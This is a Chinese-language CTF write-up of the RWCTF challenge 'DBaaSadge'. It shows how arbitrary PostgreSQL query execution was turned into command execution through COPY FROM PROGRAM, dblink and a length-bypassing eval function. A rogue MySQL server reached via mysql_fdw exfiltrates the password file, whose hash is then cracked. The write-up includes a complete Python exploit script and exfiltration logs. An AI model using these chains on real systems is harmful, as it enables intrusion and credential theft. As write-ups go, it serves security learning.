# RWCTF

## DBaaSadge

查看题目

```php
<?php
error_reporting(0);

if(!$sql=(string)$_GET["sql"]){
  show_source(__FILE__);
  die();
}

header('Content-Type: text/plain');

if(strlen($sql)>100){
  die('That query is too long ;_;');
}

if(!pg_pconnect('dbname=postgres user=realuser')){
  die('DB gone ;_;');
}

if($query = pg_query($sql)){
  print_r(pg_fetch_all($query));
} else {
  die('._.?');
}
```

1. 发现传参为sql

2. 长度不能大于100

3. 使用的数据名为postgres用户为realuser



查看dockerfile

发现他把flag和read flag放进去，并赋予不同的权限

这个时候的想法是，通过sql传参数调用readflag去读flag，继续读dockerfile，发现数据库开启了俩个扩展mysql_fdw,dblink

然后就开始寻找漏洞



发现可以进行命令执行[CVE-2019-9193](https://blog.csdn.net/qq_42133828/article/details/96726677)
```mysql
DROP TABLE IF EXISTS cmd_exec;
REATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'ID';
SELECT * FROM cmd_exec;
```

启用了扩展dblink。通过此扩展，我们可以通过指定主机，数据库，用户和密码来连接Postgres数据库，把自己的权限提升到超级权限

```mysql
SELECT * FROM dblink ('host=127.0.0.1 dbname=postgres user=postgres password=password', 'COPY cmd_table FROM PROGRAM ''/readflag'';') AS a (b text);
```

1. 长度超过了100所以需要绕过长度

2. program只对超级用户有用，又不知道postgres的密码 ，所以现在有一个目标就是获取postgres的密码



### 突破长度限制

```mysql
CREATE FUNCTION eval_func (i TEXT, out o TEXT) AS $$ BEGIN execute i INTO o; END $$ LANGUAGE plpgsql
```

创建的函数接受输入文本i，执行该文本，然后返回输出o-正是我们希望从eval中获得的结果

```mysql
CREATE TABLE eval_table (t text);
INSERT INTO eval_table VALUES('SELECT * FROM dblink (''host=127.0.0.1 dbname=postgres ');
INSERT INTO eval_table VALUES('user=postgres password=password'', ''COPY cmd_table');
INSERT INTO eval_table VALUES('FROM PROGRAM ''''/readflag'''';'') AS a(b text);');
SELECT eval_func(string_agg(t, '')) FROM eval_table;
```

我们将命令的所有部分插入到eval表中，并使用连接的命令字符串作为输入来调用eval函数。

### 获取postgres的密码

根据配置文件十分钟重置一次postgres的密码

开启了mysql_fdw插件，可以连接远程mysql

MySQL包含一个称为LOAD DATA的函数，该函数使用户可以将文件中的数据加载到表中。但是，如果客户端指定LOCAL关键字，它也允许客户端提供本地文件。由于SQL语句解析是在服务器端进行的，因此恶意的MySQL服务器可能随时告诉连接的客户端传输任何文件。

使用mysql_fdw，Postgres服务器处于MySQL客户端的状态，可能会受到此设计缺陷的攻击。例如，使用以下SQL语句，我们可以将Postgres服务器连接到MySQL服务器，无论是否恶意。

```mysql
CREATE SERVER mysql_server FOREIGN DATA WRAPPER mysql_fdw OPTIONS (host '< server ip>', port '3306');
CREATE USER MAPPING FOR realuser SERVER mysql_server OPTIONS (username 'a', password 'b');
CREATE FOREIGN TABLE foreign_table(t int, n text) SERVER mysql_server OPTIONS (dbname 'db', table_name 'w');
SELECT * FROM foreign_table;
```

利用上述漏洞的恶意服务器已经在GitHub的[Rogue-MySQL-Serve](https://github.com/jib1337/Rogue-MySQL-Serve)实现。服务器从客户端下载我们为其指定路径的任何文件

现在的目标：找到数据库密码保存的文件路径

搭建docker，到有docker-compose.yaml目录

```bash
docker-compose up -d
docker ps -a 
docker exec -it name bash
root@a8c4eee600a6:/# ls
bin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt  opt  proc  readflag  root  run  sbin  srv  start.sh  sys  tmp  usr  var
root@a8c4eee600a6:/# su postgres
postgres@a8c4eee600a6:/$ ls
bin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt  opt  proc  readflag  root  run  sbin  srv  start.sh  sys  tmp  usr  var
postgres@a8c4eee600a6:/$ psql
psql (10.15 (Ubuntu 10.15-0ubuntu0.18.04.1))
Type "help" for help.

postgres=# show data_directory;
       data_directory
-----------------------------
 /var/lib/postgresql/10/main
(1 row)

root@a8c4eee600a6:~# cd /var/lib/postgresql/10/main/
root@a8c4eee600a6:/var/lib/postgresql/10/main# grep -r "md5" ./
Binary file ./base/13016/2691 matches
Binary file ./base/13016/1255 matches
Binary file ./base/13017/2691 matches
Binary file ./base/13017/1255 matches
Binary file ./base/1/2691 matches
Binary file ./base/1/1255 matches
Binary file ./pg_wal/000000010000000000000001 matches
Binary file ./global/1260 matches
root@a8c4eee600a6:/var/lib/postgresql/10/main# cat global/1260
8�g╔8@ ╝ ,╗��� �����@��Н�`��М ╔@� ╔,
                                    �
                                     ) �╚
postgres╔╔╔╔╔╔╔����Imd5d8687ec9a9bed5b6db997ef8629369b3+╗

                                                           �╚@realuser╔╔����Imd586418c2054ff4382b90a4b94b10b060b╔═
                                                                                                                             �╔hpg_signal_backend╔����╔║
                                                                                                                                                                      �╔
pg_monitor╔����╔,
                 @�║ �╔╔╗
                                  �╔.    �╔-
postgres╔╔╔╔╔╔╔����
root@a8c4eee600a6:/var/lib/postgresql/10/main#
```

发现密码，google加密方式为md5(password+username)

使用爆破工具爆破[mdcrack](http://c3rb3r.openwall.net/mdcrack/)

```powershell
 .\MDCrack-sse.exe --algorithm=MD5 --append=postgres d8687ec9a9bed5b6db997ef8629369b3

Warning/ Unable to register .mds file extension
System / Charset is: abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
System / Detected processor(s): 8 x INTEL Itanium | MMX | SSE | SSE2 | SSE3
System / Target hash: d8687ec9a9bed5b6db997ef8629369b3
System / >> Using MD5 cores: maximal candidate/user salt size: 16/54 bytes
Info   / Press ESC for available runtime shortcuts (Ctrl-c to quit)
Info   / Thread #0: >> Using Core 2
Info   / Thread #1: >> Using Core 2
Info   / Thread #2: >> Using Core 2
Info   / Thread #0: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #3: >> Using Core 2
Info   / Thread #1: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #4: >> Using Core 2
Info   / Thread #2: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #5: >> Using Core 2
Info   / Thread #6: >> Using Core 2
Info   / Thread #0: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #7: >> Using Core 2
Info   / Thread #3: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #4: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #2: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #5: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #6: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #7: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #3: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #4: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #2: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #5: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #6: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #7: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #3: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #4: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #5: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #6: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #2: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #7: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #3: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #4: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #5: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #6: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #7: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #7: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #5: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #4: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #3: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #2: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #6: Candidate size:  5 ( + user salt: 8 )
----------------------------------------------------------/ Thread #2 (Success) \----
System / Thread #2: Collision found: ubnkzpostgres
Info   / Thread #2: Candidate/Hash pairs tested: 49 917 460 ( 4.99e+007 ) in 5s 255ms
Info   / Thread #2: Allocated key space: 6.06e+027 candidates, 0.00% done
Info   / Thread #2: Average speed: ~ 9 498 144 ( 9.50e+006 ) h/s
```

OK,现在就可以运行然后读取远程服务器的密码

```bash
python RogueSQL.py -f "/var/lib/postgresql/10/main/global/1260"
Rogue MySQL Server
[+] Target files:
        /var/lib/postgresql/10/main/global/1260
[+] Starting listener on port 3306... Ctrl+C to stop
```

这里由于我没有在公网的服务器，使用的是花生壳把自己的3306端口映射到公网去

诊断域名：367l95283c.qicp.vip 域名IP地址指向：103.46.128.49 转发服务器IP：103.46.128.49 域名已激活内网穿透功能，并与转发服务器IP指向一致 连接转发服务器成功   映射：367l95283c.qicp.vip:17948 局域网服务器：127.0.0.1:3306 本机内网IP：100.65.138.124 局域网服务器连接成功

现在执行exp获取password

```mysql
0: 
Length 92
statement CREATE SERVER ht FOREIGN DATA WRAPPER mysql_fdw OPTIONS (host '103.46.128.49', port '17948')
1: 
Length 87
statement CREATE USER MAPPING FOR realuser SERVER ht OPTIONS (username 'root', password '123456')
2: 
Length 86
statement CREATE FOREIGN TABLE th(t int, n text) SERVER ht OPTIONS (dbname 'db', table_name 'w')
3: ._.?
Length 17
statement SELECT * FROM th;
4: 
Length 23
statement DROP SERVER ht CASCADE;
Insert password 
```

```bash
Rogue MySQL Server
[+] Target files:
        /var/lib/postgresql/10/main/global/1260
[+] Starting listener on port 3306... Ctrl+C to stop

[+] Data recieved from 10.0.2.2
[+] Data recieved from 10.0.2.2
[+] Data recieved from 10.0.2.2
[+] Requesting /var/lib/postgresql/10/main/global/1260
[+] File /var/lib/postgresql/10/main/global/1260 obtained
```

然后爆破密码，输入密码

```mysql
4: 
Length 23
statement DROP SERVER ht CASCADE;
Insert password ubnkz
5: 
Length 25
statement DROP TABLE IF EXISTS htet
6: 
Length 28
statement DROP FUNCTION IF EXISTS htef
7: 
Length 26
statement DROP TABLE IF EXISTS htct;
8: 
Length 26
statement CREATE TABLE htet (t TEXT)
9: 
Length 94
statement CREATE FUNCTION htef(h TEXT, out f TEXT) AS $$ BEGIN execute h INTO f; END $$ LANGUAGE plpgsql
10: 
Length 34
statement CREATE TABLE htct(dm_output text);
11: 
Length 82
statement INSERT INTO htet VALUES('SELECT * FROM dblink (''host=127.0.0.1 dbname=postgres ')
12: 
Length 71
statement INSERT INTO htet VALUES('user=postgres password=ubnkz'', ''COPY htct ')
13: 
Length 76
statement INSERT INTO htet VALUES('FROM PROGRAM ''''/readflag'''';'') AS b (a text);')
14: Array
(
    [0] => Array
        (
            [htef] => COPY 2
        )

)

Length 40
statement SELECT htef(string_agg(t, '')) FROM htet
15: Array
(
    [0] => Array
        (
            [dm_output] => flag{test_flag}
        )

    [1] => Array
        (
            [dm_output] => execute this binary on the server to get the flag!
        )

)

Length 19
statement SELECT * FROM htct;
16: 
Length 16
statement DROP TABLE htct;
17: 
Length 15
statement DROP TABLE htet
18: 
Length 18
statement DROP FUNCTION htef

```

成功获取到flag

### exp

```python
import requests as rq
import string 
import random

HOST = "127.0.0.1"
#HOST = "54.219.197.26"
MYSQL_SERVER = "103.46.128.49"
MYSQL_PORT = 17948
PORT = 60080
cnt = 0

def do(statement):
    global cnt
    res = rq.get(f"http://{ HOST }:{ PORT }/?sql={ statement }")
    print(f"{ cnt }: { res.text }")
    print(f"Length { len(statement) }")
    print(f"statement { statement }")
    cnt += 1
    
def get_password():
    server = ht
    foreign_table = th
    do(f"CREATE SERVER { server } FOREIGN DATA WRAPPER mysql_fdw OPTIONS (host '{ MYSQL_SERVER }', port '{ MYSQL_PORT }')")
    do(f"CREATE USER MAPPING FOR realuser SERVER { server } OPTIONS (username 'root', password '123456')")
    do(f"CREATE FOREIGN TABLE { foreign_table }(t int, n text) SERVER { server } OPTIONS (dbname 'db', table_name 'w')")
    do(f"SELECT * FROM { foreign_table };")
    do(f"DROP SERVER { server } CASCADE;") 
    
    
def get_flag(password):
    eval_table = htet
    eval_func = htef
    cmd_table = htct

    do(f"DROP TABLE IF EXISTS { eval_table }")
    do(f"DROP FUNCTION IF EXISTS { eval_func }")
    do(f"DROP TABLE IF EXISTS { cmd_table };")

    do(f"CREATE TABLE { eval_table } (t TEXT)")
    do(f"CREATE FUNCTION { eval_func }(h TEXT, out f TEXT) AS $$ BEGIN execute h INTO f; END $$ LANGUAGE plpgsql")
    do(f"CREATE TABLE { cmd_table }(dm_output text);")

    part1 = f"SELECT * FROM dblink (''host=127.0.0.1 dbname=postgres "
    part2 = f"user=postgres password={ password }'', ''COPY { cmd_table } "
    part3 = f"FROM PROGRAM ''''/readflag'''';'') AS b (a text);"
    do(f"INSERT INTO { eval_table } VALUES('{ part1 }')")
    do(f"INSERT INTO { eval_table } VALUES('{ part2 }')")
    do(f"INSERT INTO { eval_table } VALUES('{ part3 }')")

    do(f"SELECT { eval_func }(string_agg(t, '')) FROM { eval_table }")

    do(f"SELECT * FROM { cmd_table };")

    do(f"DROP TABLE { cmd_table };")
    do(f"DROP TABLE {eval_table}")
    do(f"DROP FUNCTION { eval_func }")

def main():
    get_password()
    password = input("Insert password ")
    get_flag(password.strip()) 

if __name__ == "__main__":
    main()
```



![Image text](../markdownpictures/1.jpg)